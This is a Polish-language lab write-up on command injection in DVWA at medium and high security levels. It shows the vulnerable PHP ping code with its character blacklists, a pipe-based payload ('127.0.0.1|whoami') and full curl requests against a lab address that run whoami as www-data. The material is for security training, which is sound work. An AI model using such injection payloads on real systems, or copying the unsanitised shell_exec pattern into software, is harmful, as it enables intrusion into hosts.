# Command Injection
## Opis techniki
<blockquote>
Wstrzyknięcie poleceń to podatność, która występuje, gdy aplikacja przekazuje niebezpieczne dane dostarczone przez użytkownika (formularze, ciasteczka, nagłówki HTTP itp.) do powłoki systemowej. Pozwala to atakującemu na wykonanie dowolnych poleceń bezpośrednio w systemie operacyjnym hosta – początkowo z uprawnieniami usługi webowej.

Oto kilka kluczowych cech i zagrożeń związanych z Command Injection:
* Niewłaściwa walidacja danych wejściowych: Podatność na Command Injection pojawia się, gdy aplikacja webowa nie waliduje lub nie filtruje prawidłowo danych wejściowych, które są następnie używane do formowania i wykonania poleceń systemowych. Atakujący może wprowadzić złośliwe polecenia, które są potem uruchamiane przez system.
* Egzekucja złośliwych poleceń systemowych: Głównym zagrożeniem związanym z Command Injection jest możliwość egzekucji poleceń przez atakującego w kontekście systemu operacyjnego, na którym działa aplikacja.
* Zależność od uprawnień procesu: Skutki ataku Command Injection zależą w dużej mierze od uprawnień procesu, który wykonuje złośliwe polecenia. Jeżeli proces ma wysokie uprawnienia, na przykład jest uruchamiany jako root lub administrator, atakujący może zdobyć pełną kontrolę nad systemem.
</blockquote>

## Zapobieganie
<blockquote>
plikacje powinny unikać uruchamiania poleceń systemowych, jeśli to możliwe. Jeśli jest to nieuniknione, powinny używać interfejsów API, które pozwalają na silną parametryzację poleceń i nie pozwalają na łączenie poleceń ani przekierowanie.
</blockquote>

## DVWA labs
- [DVWA Command Injection #1 - Medium](#dvwa-Command-Injection-1---medium)
- [DVWA Command Injection #2 - High](#dvwa-Command-Injection-2---high)

<br/>

## DVWA Command Injection #1 - Medium
Na średnim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Filtrowanie znaków "&&" oraz ";"

#### Kod źródłowy strony `PHP`
```php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?> 
```

#### Payload
Podatny endpoint: `http://10.10.236.56/vulnerabilities/exec`<br/>
Parametr POST: ip=127.0.0.1|whoami

#### Komenda curl - [Wzór zapytania]
```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.236.56' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 37' -H $'Origin: http://10.10.236.56' -H $'Connection: close' -H $'Referer: http://10.10.236.56/vulnerabilities/exec/' -H $'Upgrade-Insecure-Requests: 1' -b $'PHPSESSID=o8’’bg59jl012q96i1sjk4p9ieo0; security=medium' --data-binary $'ip=127.0.0.1+%7C+whoami&Submit=Submit'  $'http://10.10.236.56/vulnerabilities/exec/'
```

#### Request i efekt działania:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/CMD_Injection_med.png "Po wykonaniu odpowiedniego zapytania następuje wykonanie komendy whoami.")

Po wykonaniu odpowiedniego zapytania następuje wykonanie komendy "whoami", co widać w odpowiedzi serwera - użytkownik wykonujący wstrzykniętą komendę to "www-data".

<br/>
<br/>

## DVWA Command Injection #2 - High
Na trudnym poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Filtrowanie dużo większej ilości znaków/ciągów znaków związanych z syntax'em powłoki

#### Kod źródłowy strony `PHP`
```php
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?> 
```

#### Payload
Podatny endpoint: `http://10.10.236.56/vulnerabilities/exec`<br/>
Parametr POST: ip=127.0.0.1|whoami

#### Komenda curl - [Wzór zapytania]
```bash
curl -i -s -k -X $'POST' \ -H $'Host: 10.10.236.56' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 35' -H $'Origin: http://10.10.236.56' -H $'Connection: close' -H $'Referer: http://10.10.236.56/vulnerabilities/exec/' -H $'Upgrade-Insecure-Requests: 1'  -b $'PHPSESSID=o8bg59jl012q96i1sjk4p9ieo0; security=high'  --data-binary $'ip=127.0.0.1%7Cwhoami&Submit=Submit' $'http://10.10.236.56/vulnerabilities/exec/'
```

#### Request i efekt działania:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/CMD_Injection_high.png "Po wykonaniu odpowiedniego zapytania następuje wykonanie komendy whoami.")

<br/>

Po wykonaniu odpowiedniego zapytania następuje wykonanie komendy "whoami", co widać w odpowiedzi serwera - użytkownik wykonujący wstrzykniętą komendę to "www-data".
